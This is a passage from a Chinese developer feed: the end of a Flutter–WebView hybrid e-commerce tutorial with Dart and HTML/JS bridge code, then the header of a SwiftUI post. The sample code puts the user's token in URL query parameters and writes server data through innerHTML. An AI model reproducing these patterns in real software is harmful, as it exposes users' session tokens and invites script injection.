      window.addEventListener('unhandledrejection', function(event) {
        const errorData = {
          type: 'promise_rejection',
          reason: event.reason?.toString(),
          timestamp: Date.now()
        };
        
        if (window.FlutterBridge) {
          window.FlutterBridge.postMessage(JSON.stringify({
            type: 'error',
            data: errorData
          }));
        }
      });
    '''</span>);
  }
  
  <span class="hljs-comment">// 上报error到服务端</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; reportErrors() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_errors.isEmpty) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> http.post(
        <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://api.xxxx.com/error-report'</span>),
        body: jsonEncode({
          <span class="hljs-string">'appVersion'</span>: <span class="hljs-string">'1.0.0'</span>,
          <span class="hljs-string">'platform'</span>: Platform.operatingSystem,
          <span class="hljs-string">'errors'</span>: _errors,
        }),
        headers: {<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>},
      );
      
      _errors.clear();
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'错误上报失败: <span class="hljs-subst">$e</span>'</span>);
    }
  }
}
</code></pre>
<h2 data-id="heading-28">八：以电商混合应用为例</h2>
<h3 data-id="heading-29">8.1 项目架构</h3>
<p>下面我们通过一个电商App的案例，把前面所有知识点串联起来：</p>
<pre><code class="hljs language-bash" lang="bash">lib/
├── main.dart
├── core/
│   ├── hybrid/           <span class="hljs-comment"># 混合开发</span>
│   │   ├── manager.dart     <span class="hljs-comment"># 混合管理器</span>
│   │   ├── bridge.dart      <span class="hljs-comment"># 桥接文件</span>
│   │   ├── router.dart      <span class="hljs-comment"># 混合路由</span>
│   │   └── security.dart    <span class="hljs-comment"># 安全模块</span>
│   └── di/               <span class="hljs-comment"># 依赖注入</span>
├── modules/
│   ├── product/          <span class="hljs-comment"># 商品模块</span>
│   │   ├── list_page.dart   <span class="hljs-comment"># 原生列表</span>
│   │   └── detail_page.dart <span class="hljs-comment"># WebView详情</span>
│   ├── cart/             <span class="hljs-comment"># 购物车模块</span>
│   └── order/            <span class="hljs-comment"># 订单模块</span>
└── shared/
    ├── widgets/          <span class="hljs-comment"># 共享组件</span>
    ├── utils/            <span class="hljs-comment"># 工具类</span>
    └── constants/        <span class="hljs-comment"># 常量定义</span>
</code></pre>
<h3 data-id="heading-30">8.2 实现商品详情页</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductDetailPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> productId;
  
  <span class="hljs-keyword">const</span> ProductDetailPage({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.productId}) 
      : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _ProductDetailPageState createState() =&gt; _ProductDetailPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_ProductDetailPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">ProductDetailPage</span>&gt; </span>{
  <span class="hljs-keyword">late</span> WebViewController _controller;
  <span class="hljs-keyword">final</span> ProductService _productService = ProductService();
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _initWebView();
    _prefetchProductData();
  }
  
  <span class="hljs-keyword">void</span> _initWebView() {
    <span class="hljs-comment">// 从WebView池获取或创建</span>
    _controller = WebViewPool.getWebView(
      key: <span class="hljs-string">'product_<span class="hljs-subst">${widget.productId}</span>'</span>,
      builder: () =&gt; _createWebViewController(),
    );
  }
  
  Future&lt;WebViewController&gt; _createWebViewController() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> controller = WebViewController();
    
    <span class="hljs-comment">// 获取用户信息和商品数据</span>
    <span class="hljs-keyword">final</span> userInfo = <span class="hljs-keyword">await</span> UserService().getCurrentUser();
    <span class="hljs-keyword">final</span> productData = <span class="hljs-keyword">await</span> _productService.getProduct(widget.productId);
    
    <span class="hljs-comment">// 含参URL</span>
    <span class="hljs-keyword">final</span> url = _buildProductUrl(productData, userInfo);
    
    <span class="hljs-keyword">await</span> controller.loadRequest(<span class="hljs-built_in">Uri</span>.parse(url));
    
    <span class="hljs-keyword">return</span> controller;
  }
  
  <span class="hljs-built_in">String</span> _buildProductUrl(Product product, User? user) {
    <span class="hljs-keyword">final</span> params = {
      <span class="hljs-string">'product_id'</span>: product.id,
      <span class="hljs-string">'product_name'</span>: <span class="hljs-built_in">Uri</span>.encodeComponent(product.name),
      <span class="hljs-string">'price'</span>: product.price.toString(),
      <span class="hljs-string">'user_id'</span>: user?.id ?? <span class="hljs-string">''</span>,
      <span class="hljs-string">'user_token'</span>: user?.token ?? <span class="hljs-string">''</span>,
      <span class="hljs-string">'platform'</span>: Platform.operatingSystem,
      <span class="hljs-string">'app_version'</span>: <span class="hljs-string">'1.0.0'</span>,
      <span class="hljs-string">'timestamp'</span>: <span class="hljs-built_in">DateTime</span>.now().millisecondsSinceEpoch.toString(),
    };
    
    <span class="hljs-comment">// 添加签名</span>
    <span class="hljs-keyword">final</span> signature = _generateSignature(params);
    params[<span class="hljs-string">'sign'</span>] = signature;
    
    <span class="hljs-keyword">final</span> uri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://m.xxxx.com/product/detail'</span>)
        .replace(queryParameters: params);
    
    <span class="hljs-keyword">return</span> uri.toString();
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(
        title: Text(<span class="hljs-string">'商品详情'</span>),
        actions: _buildAppBarActions(),
      ),
      body: Column(
        children: [
          <span class="hljs-comment">// 顶部：商品简介</span>
          _buildProductSummary(),
          
          <span class="hljs-comment">// WebView详情部分</span>
          Expanded(
            child: WebViewWidget(controller: _controller),
          ),
          
          <span class="hljs-comment">// 底部：原生操作栏</span>
          _buildBottomActionBar(),
        ],
      ),
    );
  }
  
  Widget _buildProductSummary() {
    <span class="hljs-keyword">return</span> Container(
      padding: EdgeInsets.all(<span class="hljs-number">16</span>),
      decoration: BoxDecoration(
        color: Colors.white,
        border: Border(bottom: BorderSide(color: Colors.grey[<span class="hljs-number">200</span>]!)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            <span class="hljs-string">'商品名称'</span>,
            style: TextStyle(fontSize: <span class="hljs-number">18</span>, fontWeight: FontWeight.bold),
          ),
          SizedBox(height: <span class="hljs-number">8</span>),
          Row(
            children: [
              Text(
                <span class="hljs-string">'¥ 299.00'</span>,
                style: TextStyle(
                  fontSize: <span class="hljs-number">24</span>,
                  color: Colors.red,
                  fontWeight: FontWeight.bold,
                ),
              ),
              SizedBox(width: <span class="hljs-number">8</span>),
              Text(
                <span class="hljs-string">'¥ 399.00'</span>,
                style: TextStyle(
                  fontSize: <span class="hljs-number">16</span>,
                  color: Colors.grey,
                  decoration: TextDecoration.lineThrough,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }
  
  Widget _buildBottomActionBar() {
    <span class="hljs-keyword">return</span> Container(
      height: <span class="hljs-number">60</span>,
      decoration: BoxDecoration(
        color: Colors.white,
        border: Border(top: BorderSide(color: Colors.grey[<span class="hljs-number">200</span>]!)),
      ),
      child: Row(
        children: [
          <span class="hljs-comment">// 客服</span>
          Expanded(
            child: TextButton.icon(
              onPressed: _contactCustomerService,
              icon: Icon(Icons.chat),
              label: Text(<span class="hljs-string">'客服'</span>),
            ),
          ),
          
          <span class="hljs-comment">// 加入购物车</span>
          Expanded(
            child: ElevatedButton.icon(
              onPressed: _addToCart,
              icon: Icon(Icons.shopping_cart),
              label: Text(<span class="hljs-string">'加入购物车'</span>),
              style: ElevatedButton.styleFrom(
                primary: Colors.orange,
              ),
            ),
          ),
          
          <span class="hljs-comment">// 立即购买</span>
          Expanded(
            child: ElevatedButton.icon(
              onPressed: _buyNow,
              icon: Icon(Icons.shopping_bag),
              label: Text(<span class="hljs-string">'立即购买'</span>),
              style: ElevatedButton.styleFrom(
                primary: Colors.red,
              ),
            ),
          ),
        ],
      ),
    );
  }
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; _addToCart() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 通过桥接通知H5页面</span>
    <span class="hljs-keyword">await</span> _controller.runJavaScript(<span class="hljs-string">'''
      if (window.addToCart) {
        window.addToCart();
      } else {
        // 调用Flutter原生方法
        window.FlutterBridge.postMessage(JSON.stringify({
          type: 'action',
          method: 'addToCart',
          data: {productId: '<span class="hljs-subst">${widget.productId}</span>'}
        }));
      }
    '''</span>);
  }
}
</code></pre>
<h3 data-id="heading-31">8.3 适配H5页面</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>商品详情<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// Flutter桥接适配</span>
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlutterAdapter</span> {
            <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">messageId</span> = <span class="hljs-number">0</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupBridge</span>();
            }
            
            <span class="hljs-title function_">setupBridge</span>(<span class="hljs-params"/>) {
                <span class="hljs-comment">// 注册Flutter调用方法</span>
                <span class="hljs-variable language_">window</span>.<span class="hljs-property">addToCart</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addToCart</span>();
                <span class="hljs-variable language_">window</span>.<span class="hljs-property">buyNow</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buyNow</span>();
                <span class="hljs-variable language_">window</span>.<span class="hljs-property">getUserInfo</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getUserInfo</span>();
                
                <span class="hljs-comment">// 初始化消息监听</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">FlutterBridge</span>) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Flutter桥接已OK'</span>);
                }
            }
            
            <span class="hljs-comment">// 添加购物车</span>
            <span class="hljs-keyword">async</span> <span class="hljs-title function_">addToCart</span>(<span class="hljs-params"/>) {
                <span class="hljs-keyword">const</span> productId = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getQueryParam</span>(<span class="hljs-string">'product_id'</span>);
                
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// 通过桥接调用Flutter</span>
                    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callFlutter</span>(<span class="hljs-string">'addToCart'</span>, {
                        <span class="hljs-attr">productId</span>: productId,
                        <span class="hljs-attr">quantity</span>: <span class="hljs-number">1</span>
                    });
                    
                    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">success</span>) {
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">'添加成功'</span>);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">'添加失败: '</span> + result.<span class="hljs-property">message</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'添加购物车失败:'</span>, error);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">'网络异常，请重试'</span>);
                }
            }
            
            <span class="hljs-comment">// 调用Flutter方法</span>
            <span class="hljs-title function_">callFlutter</span>(<span class="hljs-params">method, data</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
                    <span class="hljs-keyword">const</span> messageId = ++<span class="hljs-variable language_">this</span>.<span class="hljs-property">messageId</span>;
                    
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">set</span>(messageId, { resolve, reject });
                    
                    <span class="hljs-comment">// 设置超时</span>
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">has</span>(messageId)) {
                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">delete</span>(messageId);
                            <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'请求超时'</span>));
                        }
                    }, <span class="hljs-number">10000</span>);
                    
                    <span class="hljs-comment">// 发送消息</span>
                    <span class="hljs-variable language_">window</span>.<span class="hljs-property">FlutterBridge</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                        <span class="hljs-attr">id</span>: messageId.<span class="hljs-title function_">toString</span>(),
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'request'</span>,
                        <span class="hljs-attr">method</span>: method,
                        <span class="hljs-attr">data</span>: data,
                        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
                    }));
                });
            }
            
            <span class="hljs-comment">// 接收Flutter消息</span>
            <span class="hljs-title function_">onFlutterMessage</span>(<span class="hljs-params">message</span>) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message);
                    
                    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'response'</span> &amp;&amp; data.<span class="hljs-property">id</span>) {
                        <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">get</span>(<span class="hljs-built_in">parseInt</span>(data.<span class="hljs-property">id</span>));
                        <span class="hljs-keyword">if</span> (callback) {
                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">delete</span>(<span class="hljs-built_in">parseInt</span>(data.<span class="hljs-property">id</span>));
                            
                            <span class="hljs-keyword">if</span> (data.<span class="hljs-property">data</span>.<span class="hljs-property">success</span>) {
                                callback.<span class="hljs-title function_">resolve</span>(data.<span class="hljs-property">data</span>);
                            } <span class="hljs-keyword">else</span> {
                                callback.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(data.<span class="hljs-property">data</span>.<span class="hljs-property">message</span>));
                            }
                        }
                    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'event'</span>) {
                        <span class="hljs-comment">// 处理Flutter发来的事件</span>
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleEvent</span>(data);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'处理Flutter消息失败:'</span>, error);
                }
            }
            
            <span class="hljs-title function_">getQueryParam</span>(<span class="hljs-params">name</span>) {
                <span class="hljs-keyword">const</span> urlParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
                <span class="hljs-keyword">return</span> urlParams.<span class="hljs-title function_">get</span>(name);
            }
            
            <span class="hljs-title function_">showToast</span>(<span class="hljs-params">message</span>) {
                <span class="hljs-comment">// 显示提示</span>
                <span class="hljs-keyword">const</span> toast = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
                toast.<span class="hljs-property">textContent</span> = message;
                toast.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = <span class="hljs-string">`
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background: rgba(0,0,0,0.8);
                    color: white;
                    padding: 12px 24px;
                    border-radius: 8px;
                    z-index: 1000;
                `</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(toast);
                
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(toast);
                }, <span class="hljs-number">2000</span>);
            }
        }
        
        <span class="hljs-comment">// 页面初始化</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> adapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FlutterAdapter</span>();
            
            <span class="hljs-comment">// 检测运行环境</span>
            <span class="hljs-keyword">const</span> isInApp = navigator.<span class="hljs-property">userAgent</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'FlutterWebView'</span>);
            
            <span class="hljs-keyword">if</span> (isInApp) {
                <span class="hljs-comment">// App内特有逻辑</span>
                <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'in-app'</span>);
                
                <span class="hljs-comment">// 适配安全区域</span>
                <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-title function_">setProperty</span>(
                    <span class="hljs-string">'--safe-area-top'</span>, 
                    <span class="hljs-string">'env(safe-area-inset-top, 0px)'</span>
                );
                <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-title function_">setProperty</span>(
                    <span class="hljs-string">'--safe-area-bottom'</span>, 
                    <span class="hljs-string">'env(safe-area-inset-bottom, 0px)'</span>
                );
                
                <span class="hljs-comment">// 隐藏H5导航</span>
                <span class="hljs-keyword">const</span> h5Nav = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.h5-navigation'</span>);
                <span class="hljs-keyword">if</span> (h5Nav) h5Nav.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
            }
            
            <span class="hljs-comment">// 加载商品数据</span>
            <span class="hljs-title function_">loadProductData</span>();
        });
        
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadProductData</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> productId = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>)
                .<span class="hljs-title function_">get</span>(<span class="hljs-string">'product_id'</span>);
            
            <span class="hljs-keyword">if</span> (!productId) <span class="hljs-keyword">return</span>;
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(
                    <span class="hljs-string">`https://api.xxxx.com/products/<span class="hljs-subst">${productId}</span>`</span>
                );
                <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
                
                <span class="hljs-title function_">renderProduct</span>(product);
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'加载商品失败:'</span>, error);
                <span class="hljs-title function_">showError</span>(<span class="hljs-string">'加载失败，请重试'</span>);
            }
        }
        
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">renderProduct</span>(<span class="hljs-params">product</span>) {
            <span class="hljs-comment">// 渲染商品信息</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'product-title'</span>).<span class="hljs-property">textContent</span> = product.<span class="hljs-property">name</span>;
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'product-price'</span>).<span class="hljs-property">textContent</span> = 
                <span class="hljs-string">`¥ <span class="hljs-subst">${product.price}</span>`</span>;
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'product-desc'</span>).<span class="hljs-property">innerHTML</span> = 
                product.<span class="hljs-property">description</span>;
            
            <span class="hljs-comment">// 渲染图片</span>
            <span class="hljs-keyword">const</span> gallery = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'product-gallery'</span>);
            product.<span class="hljs-property">images</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">img</span> =&gt;</span> {
                <span class="hljs-keyword">const</span> imgEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'img'</span>);
                imgEl.<span class="hljs-property">src</span> = img.<span class="hljs-property">url</span>;
                imgEl.<span class="hljs-property">alt</span> = product.<span class="hljs-property">name</span>;
                gallery.<span class="hljs-title function_">appendChild</span>(imgEl);
            });
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"product-title"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"price"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"product-price"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"gallery"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"product-gallery"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"description"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"product-desc"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-32">总结</h2>
<p>至此Flutter混合开发与WebView相关知识点就全部介绍完了，牢记一下核心原则：</p>
<ul>
<li><strong>优先性能</strong>：WebView预加载、内存管理、缓存</li>
<li><strong>安全第一</strong>：输入验证、通信加密、权限控制</li>
</ul>
<blockquote>
<p><strong>避坑指南:</strong></p>
<p>常见问题及解决方案：</p>
<ol>
<li>
<p><strong>WebView白屏</strong></p>
</li>
</ol>
<ul>
<li>
<p>原因：内存不足或初始化问题</p>
</li>
<li>
<p>解决：实现WebView复用，添加重试机制</p>
</li>
</ul>
<ol start="2">
<li>
<p><strong>通信延迟高</strong></p>
</li>
</ol>
<ul>
<li>
<p>原因：频繁小消息通信</p>
</li>
<li>
<p>解决：批量处理，二进制协议</p>
</li>
</ul>
<ol start="3">
<li>
<p><strong>内存泄漏</strong></p>
</li>
</ol>
<ul>
<li>
<p>原因：未正确释放WebView</p>
</li>
<li>
<p>解决：使用WeakReference，管理生命周期</p>
</li>
</ul>
<ol start="4">
<li>
<p><strong>跨平台差异</strong></p>
</li>
</ol>
<ul>
<li>原因：iOS/Android WebView实现不同</li>
<li>解决：平台适配层，功能降级</li>
</ul>
</blockquote>
<h2 data-id="heading-33">结语</h2>
<p>混合开发不是简单的炫技，而是在原生与web之间的性能、安全、体验、效率等方面寻找一个最佳的平衡点。技术只是手段，用户体验才是目的。</p>
<p><strong>如果觉得本文对你有帮助，别忘了一键三连~~~，有任何问题或想法，欢迎在评论区交流讨论！</strong>
<strong>转载请注明出处！！！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[#1 onLongPressGesture]]></title>    <link>https://juejin.cn/post/7580303864604409865</link>    <guid>https://juejin.cn/post/7580303864604409865</guid>    <pubDate>2025-12-06T09:00:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580303864604409865" data-draft-id="7580303864604262409" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="#1 onLongPressGesture"/> <meta itemprop="keywords" content="iOS,SwiftUI"/> <meta itemprop="datePublished" content="2025-12-06T09:00:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Neo_Arsaka"/> <meta itemprop="url" content="https://juejin.cn/user/1955363207515927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            #1 onLongPressGesture
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1955363207515927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Neo_Arsaka
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:00:01.000Z" title="Sat Dec 06 2025 09:00:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
